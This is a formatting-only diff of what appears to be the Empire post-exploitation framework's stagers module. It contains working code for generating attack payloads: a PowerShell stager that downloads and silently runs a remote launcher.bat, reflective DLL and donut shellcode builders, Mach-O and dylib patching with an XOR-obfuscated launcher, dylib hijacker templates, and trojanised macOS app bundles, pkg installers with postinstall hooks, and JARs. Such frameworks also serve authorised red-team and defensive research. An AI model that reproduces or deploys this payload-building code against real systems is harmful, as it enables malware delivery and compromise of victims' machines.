@@ -13,11 +13,8 @@ The Stagers() class in instantiated in ./server.py by the main menu and includes
     generate_dylib() - generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application
 
 """
-from __future__ import absolute_import
-from __future__ import division
-from __future__ import print_function
+from __future__ import absolute_import, division, print_function
 
-import donut
 import base64
 import errno
 import fnmatch
@@ -26,80 +23,112 @@ import os
 import shutil
 import subprocess
 import zipfile
-from builtins import chr
-from builtins import object
-from builtins import str
-from builtins import zip
+from builtins import chr, object, str, zip
 from itertools import cycle
 
+import donut
 import macholib.MachO
 from past.utils import old_div
 
 from empire.server.database import models
 from empire.server.database.base import SessionLocal
 from empire.server.v2.core.listener_service import ListenerService
+
 from . import helpers
 
 
 class Stagers(object):
-
     def __init__(self, MainMenu, args):
 
         self.mainMenu = MainMenu
         self.args = args
 
-    def generate_launcher_fetcher(self, language=None, encode=True, webFile='http://127.0.0.1/launcher.bat', launcher='powershell -noP -sta -w 1 -enc '):
-        #TODO add handle for other than powershell language
-        stager = 'wget "' + webFile + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
+    def generate_launcher_fetcher(
+        self,
+        language=None,
+        encode=True,
+        webFile="http://127.0.0.1/launcher.bat",
+        launcher="powershell -noP -sta -w 1 -enc ",
+    ):
+        # TODO add handle for other than powershell language
+        stager = (
+            'wget "'
+            + webFile
+            + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
+        )
         if encode:
             return helpers.powershell_launcher(stager, launcher)
         else:
             return stager
 
-    def generate_launcher(self, listenerName, language=None, encode=True, obfuscate=False, obfuscationCommand="",
-                          userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0',
-                          safeChecks='true', bypasses: str = ''):
+    def generate_launcher(
+        self,
+        listenerName,
+        language=None,
+        encode=True,
+        obfuscate=False,
+        obfuscationCommand="",
+        userAgent="default",
+        proxy="default",
+        proxyCreds="default",
+        stagerRetries="0",
+        safeChecks="true",
+        bypasses: str = "",
+    ):
         """
         Abstracted functionality that invokes the generate_launcher() method for a given listener,
         if it exists.
         """
         with SessionLocal.begin() as db:
             bypasses_parsed = []
-            for bypass in bypasses.split(' '):
+            for bypass in bypasses.split(" "):
                 b = db.query(models.Bypass).filter(models.Bypass.name == bypass).first()
                 if b:
                     bypasses_parsed.append(b.code)
 
             db_listener = self.mainMenu.listenersv2.get_by_name(db, listenerName)
-            active_listener = self.mainMenu.listenersv2.get_active_listeners()[db_listener.id] # todo another function for get 1
+            active_listener = self.mainMenu.listenersv2.get_active_listeners()[
+                db_listener.id
+            ]  # todo another function for get 1
             if not active_listener:
                 print(helpers.color(f"[!] Invalid listener: {listenerName}"))
-                return ''
+                return ""
 
-            launcher_code = active_listener\
-                .generate_launcher(encode=encode, obfuscate=obfuscate, obfuscationCommand=obfuscationCommand,
-                                   userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries,
-                                   language=language, listenerName=listenerName, safeChecks=safeChecks,
-                                   bypasses=bypasses_parsed)
+            launcher_code = active_listener.generate_launcher(
+                encode=encode,
+                obfuscate=obfuscate,
+                obfuscationCommand=obfuscationCommand,
+                userAgent=userAgent,
+                proxy=proxy,
+                proxyCreds=proxyCreds,
+                stagerRetries=stagerRetries,
+                language=language,
+                listenerName=listenerName,
+                safeChecks=safeChecks,
+                bypasses=bypasses_parsed,
+            )
             if launcher_code:
                 return launcher_code
-
 
     def generate_dll(self, poshCode, arch):
         """
         Generate a PowerPick Reflective DLL to inject with base64-encoded stager code.
         """
 
-        #read in original DLL and patch the bytes based on arch
-        if arch.lower() == 'x86':
-            origPath = "%s/data/misc/ReflectivePick_x86_orig.dll" % (self.mainMenu.installPath)
+        # read in original DLL and patch the bytes based on arch
+        if arch.lower() == "x86":
+            origPath = "%s/data/misc/ReflectivePick_x86_orig.dll" % (
+                self.mainMenu.installPath
+            )
         else:
-            origPath = "%s/data/misc/ReflectivePick_x64_orig.dll" % (self.mainMenu.installPath)
+            origPath = "%s/data/misc/ReflectivePick_x64_orig.dll" % (
+                self.mainMenu.installPath
+            )
 
         if os.path.isfile(origPath):
 
-            dllRaw = ''
-            with open(origPath, 'rb') as f:
+            dllRaw = ""
+            with open(origPath, "rb") as f:
                 dllRaw = f.read()
 
                 replacementCode = helpers.decode_base64(poshCode)
@@ -107,14 +136,20 @@ class Stagers(object):
                 # patch the dll with the new PowerShell code
                 searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
                 index = dllRaw.find(searchString)
-                dllPatched = dllRaw[:index]+replacementCode+dllRaw[(index+len(replacementCode)):]
+                dllPatched = (
+                    dllRaw[:index]
+                    + replacementCode
+                    + dllRaw[(index + len(replacementCode)) :]
+                )
 
                 return dllPatched
 
         else:
-            print(helpers.color("[!] Original .dll for arch %s does not exist!" % (arch)))
+            print(
+                helpers.color("[!] Original .dll for arch %s does not exist!" % (arch))
+            )
 
-    def generate_powershell_exe(self, posh_code, dot_net_version='net40'):
+    def generate_powershell_exe(self, posh_code, dot_net_version="net40"):
         """
         Generate powershell launcher embedded in csharp
         """
@@ -125,30 +160,32 @@ class Stagers(object):
         stager_yaml = stager_yaml.replace("{{ REPLACE_LAUNCHER }}", posh_code)
 
         compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
-        if not compiler.status == 'ON':
-            print(helpers.color('[!] csharpserver plugin not running'))
+        if not compiler.status == "ON":
+            print(helpers.color("[!] csharpserver plugin not running"))
         else:
             file_name = compiler.do_send_stager(stager_yaml, "CSharpPS")
 
         directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
         return directory
 
-    def generate_powershell_shellcode(self, posh_code, arch='both', dot_net_version='net40'):
+    def generate_powershell_shellcode(
+        self, posh_code, arch="both", dot_net_version="net40"
+    ):
         """
         Generate powershell shellcode using donut python module
         """
-        if arch == 'x86':
+        if arch == "x86":
             arch_type = 1
-        elif arch == 'x64':
+        elif arch == "x64":
             arch_type = 2
-        elif arch == 'both':
+        elif arch == "both":
             arch_type = 3
 
         directory = self.generate_powershell_exe(posh_code, dot_net_version)
         shellcode = donut.create(file=directory, arch=arch_type)
         return shellcode
 
-    def generate_python_exe(self, posh_code, dot_net_version='net40'):
+    def generate_python_exe(self, posh_code, dot_net_version="net40"):
         """
         Generate ironpython launcher embedded in csharp
         """
@@ -159,23 +196,25 @@ class Stagers(object):
         stager_yaml = stager_yaml.replace("{{ REPLACE_LAUNCHER }}", posh_code)
 
         compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
-        if not compiler.status == 'ON':
-            print(helpers.color('[!] csharpserver plugin not running'))
+        if not compiler.status == "ON":
+            print(helpers.color("[!] csharpserver plugin not running"))
         else:
             file_name = compiler.do_send_stager(stager_yaml, "CSharpPy")
 
         directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
         return directory
 
-    def generate_python_shellcode(self, posh_code, arch='both', dot_net_version='net40'):
+    def generate_python_shellcode(
+        self, posh_code, arch="both", dot_net_version="net40"
+    ):
         """
         Generate ironpython shellcode using donut python module
         """
-        if arch == 'x86':
+        if arch == "x86":
             arch_type = 1
-        elif arch == 'x64':
+        elif arch == "x64":
             arch_type = 2
-        elif arch == 'both':
+        elif arch == "both":
             arch_type = 3
 
         directory = self.generate_python_exe(posh_code, dot_net_version)
@@ -189,11 +228,17 @@ class Stagers(object):
 
         MH_EXECUTE = 2
         # with open(self.installPath + "/data/misc/machotemplate", 'rb') as f:
-        with open("%s/data/misc/machotemplate" % (self.mainMenu.installPath), 'rb') as f:
+        with open(
+            "%s/data/misc/machotemplate" % (self.mainMenu.installPath), "rb"
+        ) as f:
             macho = macholib.MachO.MachO(f.name)
 
             if int(macho.headers[0].header.filetype) != MH_EXECUTE:
-                print(helpers.color("[!] Macho binary template is not the correct filetype"))
+                print(
+                    helpers.color(
+                        "[!] Macho binary template is not the correct filetype"
+                    )
+                )
                 return ""
 
             cmds = macho.headers[0].commands
@@ -202,27 +247,37 @@ class Stagers(object):
                 count = 0
                 if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
                     count += 1
-                    if cmd[count].segname.strip(b'\x00') == b'__TEXT' and cmd[count].nsects > 0:
+                    if (
+                        cmd[count].segname.strip(b"\x00") == b"__TEXT"
+                        and cmd[count].nsects > 0
+                    ):
                         count += 1
                         for section in cmd[count]:
-                            if section.sectname.strip(b'\x00') == b'__cstring':
-                                offset = int(section.offset) + (int(section.size) - 2119)
-                                placeHolderSz = int(section.size) - (int(section.size) - 2119)
+                            if section.sectname.strip(b"\x00") == b"__cstring":
+                                offset = int(section.offset) + (
+                                    int(section.size) - 2119
+                                )
+                                placeHolderSz = int(section.size) - (
+                                    int(section.size) - 2119
+                                )
 
             template = f.read()
 
         if placeHolderSz and offset:
 
-            key = 'subF'
-            launcherCode = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(launcherCode, cycle(key)))
-            launcherCode = base64.urlsafe_b64encode(launcherCode.encode('utf-8'))
-            launcher = launcherCode + b'\x00' * (placeHolderSz - len(launcherCode))
-            patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]
+            key = "subF"
+            launcherCode = "".join(
+                chr(ord(x) ^ ord(y)) for (x, y) in zip(launcherCode, cycle(key))
+            )
+            launcherCode = base64.urlsafe_b64encode(launcherCode.encode("utf-8"))
+            launcher = launcherCode + b"\x00" * (placeHolderSz - len(launcherCode))
+            patchedMachO = (
+                template[:offset] + launcher + template[(offset + len(launcher)) :]
+            )
 
             return patchedMachO
         else:
             print(helpers.color("[!] Unable to patch MachO binary"))
-
 
     def generate_dylib(self, launcherCode, arch, hijacker):
         """
@@ -231,16 +286,31 @@ class Stagers(object):
         import macholib.MachO
 
         MH_DYLIB = 6
-        if hijacker.lower() == 'true':
-            if arch == 'x86':
-                f = open("%s/data/misc/hijackers/template.dylib" % (self.mainMenu.installPath), 'rb')
+        if hijacker.lower() == "true":
+            if arch == "x86":
+                f = open(
+                    "%s/data/misc/hijackers/template.dylib"
+                    % (self.mainMenu.installPath),
+                    "rb",
+                )
             else:
-                f = open("%s/data/misc/hijackers/template64.dylib" % (self.mainMenu.installPath), 'rb')
+                f = open(
+                    "%s/data/misc/hijackers/template64.dylib"
+                    % (self.mainMenu.installPath),
+                    "rb",
+                )
         else:
-            if arch == 'x86':
-                f = open("%s/data/misc/templateLauncher.dylib" % (self.mainMenu.installPath), 'rb')
+            if arch == "x86":
+                f = open(
+                    "%s/data/misc/templateLauncher.dylib" % (self.mainMenu.installPath),
+                    "rb",
+                )
             else:
-                f = open("%s/data/misc/templateLauncher64.dylib" % (self.mainMenu.installPath), 'rb')
+                f = open(
+                    "%s/data/misc/templateLauncher64.dylib"
+                    % (self.mainMenu.installPath),
+                    "rb",
+                )
 
         macho = macholib.MachO.MachO(f.name)
 
@@ -252,12 +322,18 @@ class Stagers(object):
 
         for cmd in cmds:
             count = 0
-            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
+            if (
+                int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64
+                or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT
+            ):
                 count += 1
-                if cmd[count].segname.strip(b'\x00') == b'__TEXT' and cmd[count].nsects > 0:
+                if (
+                    cmd[count].segname.strip(b"\x00") == b"__TEXT"
+                    and cmd[count].nsects > 0
+                ):
                     count += 1
                     for section in cmd[count]:
-                        if section.sectname.strip(b'\x00') == b'__cstring':
+                        if section.sectname.strip(b"\x00") == b"__cstring":
                             offset = int(section.offset)
                             placeHolderSz = int(section.size) - 52
         template = f.read()
@@ -266,14 +342,15 @@ class Stagers(object):
         if placeHolderSz and offset:
 
             launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
-            if isinstance(launcher,str):
-                launcher = launcher.encode('UTF-8')
-            patchedDylib = b"".join([template[:offset],launcher,template[(offset+len(launcher)):]])
+            if isinstance(launcher, str):
+                launcher = launcher.encode("UTF-8")
+            patchedDylib = b"".join(
+                [template[:offset], launcher, template[(offset + len(launcher)) :]]
+            )
 
             return patchedDylib
         else:
             print(helpers.color("[!] Unable to patch dylib"))
-
 
     def generate_appbundle(self, launcherCode, Arch, icon, AppName, disarm):
 
@@ -282,30 +359,52 @@ class Stagers(object):
         """
         MH_EXECUTE = 2
 
-        if Arch == 'x64':
+        if Arch == "x64":
 
-            f = open(self.mainMenu.installPath + "/data/misc/apptemplateResources/x64/launcher.app/Contents/MacOS/launcher", "rb")
-            directory = self.mainMenu.installPath + "/data/misc/apptemplateResources/x64/launcher.app/"
+            f = open(
+                self.mainMenu.installPath
+                + "/data/misc/apptemplateResources/x64/launcher.app/Contents/MacOS/launcher",
+                "rb",
+            )
+            directory = (
+                self.mainMenu.installPath
+                + "/data/misc/apptemplateResources/x64/launcher.app/"
+            )
         else:
-            f = open(self.mainMenu.installPath + "/data/misc/apptemplateResources/x86/launcher.app/Contents/MacOS/launcher", "rb")
-            directory = self.mainMenu.installPath + "/data/misc/apptemplateResources/x86/launcher.app/"
+            f = open(
+                self.mainMenu.installPath
+                + "/data/misc/apptemplateResources/x86/launcher.app/Contents/MacOS/launcher",
+                "rb",
+            )
+            directory = (
+                self.mainMenu.installPath
+                + "/data/misc/apptemplateResources/x86/launcher.app/"
+            )
 
         macho = macholib.MachO.MachO(f.name)
 
         if int(macho.headers[0].header.filetype) != MH_EXECUTE:
-            print(helpers.color("[!] Macho binary template is not the correct filetype"))
+            print(
+                helpers.color("[!] Macho binary template is not the correct filetype")
+            )
             return ""
 
         cmds = macho.headers[0].commands
 
         for cmd in cmds:
             count = 0
-            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
+            if (
+                int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64
+                or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT
+            ):
                 count += 1
-                if cmd[count].segname.strip(b'\x00') == b'__TEXT' and cmd[count].nsects > 0:
+                if (
+                    cmd[count].segname.strip(b"\x00") == b"__TEXT"
+                    and cmd[count].nsects > 0
+                ):
                     count += 1
                     for section in cmd[count]:
-                        if section.sectname.strip(b'\x00') == b'__cstring':
+                        if section.sectname.strip(b"\x00") == b"__cstring":
                             offset = int(section.offset)
                             placeHolderSz = int(section.size) - 52
 
@@ -314,30 +413,41 @@ class Stagers(object):
 
         if placeHolderSz and offset:
 
-            launcher = launcherCode.encode('utf-8') + b'\x00' * (placeHolderSz - len(launcherCode))
-            patchedBinary = template[:offset]+launcher+template[(offset+len(launcher)):]
+            launcher = launcherCode.encode("utf-8") + b"\x00" * (
+                placeHolderSz - len(launcherCode)
+            )
+            patchedBinary = (
+                template[:offset] + launcher + template[(offset + len(launcher)) :]
+            )
             if AppName == "":
                 AppName = "launcher"
 
             tmpdir = "/tmp/application/%s.app/" % AppName
             shutil.copytree(directory, tmpdir)
-            f = open(tmpdir + "Contents/MacOS/launcher","wb")
+            f = open(tmpdir + "Contents/MacOS/launcher", "wb")
             if disarm != True:
                 f.write(patchedBinary)
                 f.close()
             else:
-                t = open(self.mainMenu.installPath+"/data/misc/apptemplateResources/empty/macho",'rb')
+                t = open(
+                    self.mainMenu.installPath
+                    + "/data/misc/apptemplateResources/empty/macho",
+                    "rb",
+                )
                 w = t.read()
                 f.write(w)
                 f.close()
                 t.close()
 
-            os.rename(tmpdir + "Contents/MacOS/launcher",tmpdir + "Contents/MacOS/%s" % AppName)
-            os.chmod(tmpdir+"Contents/MacOS/%s" % AppName, 0o755)
+            os.rename(
+                tmpdir + "Contents/MacOS/launcher",
+                tmpdir + "Contents/MacOS/%s" % AppName,
+            )
+            os.chmod(tmpdir + "Contents/MacOS/%s" % AppName, 0o755)
 
-            if icon != '':
-                iconfile = os.path.splitext(icon)[0].split('/')[-1]
-                shutil.copy2(icon,tmpdir+"Contents/Resources/"+iconfile+".icns")
+            if icon != "":
+                iconfile = os.path.splitext(icon)[0].split("/")[-1]
+                shutil.copy2(icon, tmpdir + "Contents/Resources/" + iconfile + ".icns")
             else:
                 iconfile = icon
             appPlist = """<?xml version="1.0" encoding="UTF-8"?>
@@ -398,52 +508,64 @@ class Stagers(object):
     <string>NSApplication</string>
 </dict>
 </plist>
-""" % (AppName, iconfile, AppName, AppName)
-            with open(tmpdir+"Contents/Info.plist", "w") as f:
+""" % (
+                AppName,
+                iconfile,
+                AppName,
+                AppName,
+            )
+            with open(tmpdir + "Contents/Info.plist", "w") as f:
                 f.write(appPlist)
 
-            shutil.make_archive("/tmp/launcher", 'zip', "/tmp/application")
-            shutil.rmtree('/tmp/application')
+            shutil.make_archive("/tmp/launcher", "zip", "/tmp/application")
+            shutil.rmtree("/tmp/application")
 
-            with open("/tmp/launcher.zip","rb") as f:
+            with open("/tmp/launcher.zip", "rb") as f:
                 zipbundle = f.read()
             os.remove("/tmp/launcher.zip")
             return zipbundle
-
 
         else:
             print(helpers.color("[!] Unable to patch application"))
 
     def generate_pkg(self, launcher, bundleZip, AppName):
 
-        #unzip application bundle zip. Copy everything for the installer pkg to a temporary location
+        # unzip application bundle zip. Copy everything for the installer pkg to a temporary location
         currDir = os.getcwd()
         os.chdir("/tmp/")
-        with open("app.zip","wb") as f:
+        with open("app.zip", "wb") as f:
             f.write(bundleZip)
-        zipf = zipfile.ZipFile('app.zip','r')
+        zipf = zipfile.ZipFile("app.zip", "r")
         zipf.extractall()
         zipf.close()
-        os.remove('app.zip')
+        os.remove("app.zip")
 
-        os.system("cp -r "+self.mainMenu.installPath+"/data/misc/pkgbuild/ /tmp/")
+        os.system("cp -r " + self.mainMenu.installPath + "/data/misc/pkgbuild/ /tmp/")
         os.chdir("pkgbuild")
-        os.system("cp -r ../"+AppName+".app root/Applications/")
+        os.system("cp -r ../" + AppName + ".app root/Applications/")
         os.system("chmod +x root/Applications/")
-        subprocess.call("( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload", shell=True, stderr=subprocess.DEVNULL)
+        subprocess.call(
+            "( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload",
+            shell=True,
+            stderr=subprocess.DEVNULL,
+        )
 
         os.system("chmod +x expand/Payload")
-        with open('scripts/postinstall','r+') as s:
+        with open("scripts/postinstall", "r+") as s:
             script = s.read()
-            script = script.replace('LAUNCHER',launcher)
+            script = script.replace("LAUNCHER", launcher)
             s.seek(0)
             s.write(script)
-        subprocess.call("( cd scripts && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Scripts", shell=True, stderr=subprocess.DEVNULL)
+        subprocess.call(
+            "( cd scripts && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Scripts",
+            shell=True,
+            stderr=subprocess.DEVNULL,
+        )
         os.system("chmod +x expand/Scripts")
-        numFiles = subprocess.check_output("find root | wc -l",shell=True).strip(b'\n')
-        size = subprocess.check_output("du -b -s root",shell=True).split(b'\t')[0]
+        numFiles = subprocess.check_output("find root | wc -l", shell=True).strip(b"\n")
+        size = subprocess.check_output("du -b -s root", shell=True).split(b"\t")[0]
         size = old_div(int(size), 1024)
-        with open('expand/PackageInfo','w+') as p:
+        with open("expand/PackageInfo", "w+") as p:
             pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
     <pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
         <payload numberOfFiles="KEY1" installKBytes="KEY2"/>
@@ -467,26 +589,26 @@ class Stagers(object):
         </scripts>
     </pkg-info>
     """
-            pkginfo = pkginfo.replace('APPNAME',AppName)
-            pkginfo = pkginfo.replace('KEY1',numFiles.decode('UTF-8'))
-            pkginfo = pkginfo.replace('KEY2',str(size))
+            pkginfo = pkginfo.replace("APPNAME", AppName)
+            pkginfo = pkginfo.replace("KEY1", numFiles.decode("UTF-8"))
+            pkginfo = pkginfo.replace("KEY2", str(size))
             p.write(pkginfo)
         os.system("mkbom -u 0 -g 80 root expand/Bom")
         os.system("chmod +x expand/Bom")
         os.system("chmod -R 755 expand/")
         os.system('( cd expand && xar --compression none -cf "../launcher.pkg" * )')
-        with open('launcher.pkg','rb') as f:
+        with open("launcher.pkg", "rb") as f:
             package = f.read()
         os.chdir("/tmp/")
-        shutil.rmtree('pkgbuild')
-        shutil.rmtree(AppName+".app")
+        shutil.rmtree("pkgbuild")
+        shutil.rmtree(AppName + ".app")
         return package
 
     def generate_jar(self, launcherCode):
-        with open(self.mainMenu.installPath+'/data/misc/Run.java', 'r') as f:
+        with open(self.mainMenu.installPath + "/data/misc/Run.java", "r") as f:
             javacode = f.read()
         javacode = javacode.replace("LAUNCHER", launcherCode)
-        jarpath = self.mainMenu.installPath + '/data/misc/classes/com/installer/apple/'
+        jarpath = self.mainMenu.installPath + "/data/misc/classes/com/installer/apple/"
         try:
             os.makedirs(jarpath)
         except OSError as e:
@@ -495,18 +617,33 @@ class Stagers(object):
             else:
                 pass
 
-        with open(jarpath+'Run.java', 'w') as f:
+        with open(jarpath + "Run.java", "w") as f:
             f.write(javacode)
-        os.system('javac ' + self.mainMenu.installPath + '/data/misc/classes/com/installer/apple/Run.java')
-        os.system('jar -cfe ' + self.mainMenu.installPath + '/data/misc/Run.jar com.installer.apple.Run ' + self.mainMenu.installPath + '/data/misc/classes/com/installer/apple/Run.class')
-        os.remove(self.mainMenu.installPath + '/data/misc/classes/com/installer/apple/Run.class')
-        os.remove(self.mainMenu.installPath + '/data/misc/classes/com/installer/apple/Run.java')
-        with open(self.mainMenu.installPath + '/data/misc/Run.jar', 'rb') as jarfile:
+        os.system(
+            "javac "
+            + self.mainMenu.installPath
+            + "/data/misc/classes/com/installer/apple/Run.java"
+        )
+        os.system(
+            "jar -cfe "
+            + self.mainMenu.installPath
+            + "/data/misc/Run.jar com.installer.apple.Run "
+            + self.mainMenu.installPath
+            + "/data/misc/classes/com/installer/apple/Run.class"
+        )
+        os.remove(
+            self.mainMenu.installPath
+            + "/data/misc/classes/com/installer/apple/Run.class"
+        )
+        os.remove(
+            self.mainMenu.installPath
+            + "/data/misc/classes/com/installer/apple/Run.java"
+        )
+        with open(self.mainMenu.installPath + "/data/misc/Run.jar", "rb") as jarfile:
             jar = jarfile.read()
-        os.remove(self.mainMenu.installPath + '/data/misc/Run.jar')
+        os.remove(self.mainMenu.installPath + "/data/misc/Run.jar")
 
         return jar
-
 
     def generate_upload(self, file, path):
         script = """
@@ -516,7 +653,7 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
 
 """
 
-        file_encoded = base64.b64encode(file).decode('UTF-8')
+        file_encoded = base64.b64encode(file).decode("UTF-8")
 
         script = script.replace("BASE64_BLOB_GOES_HERE", file_encoded)
         script = script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)
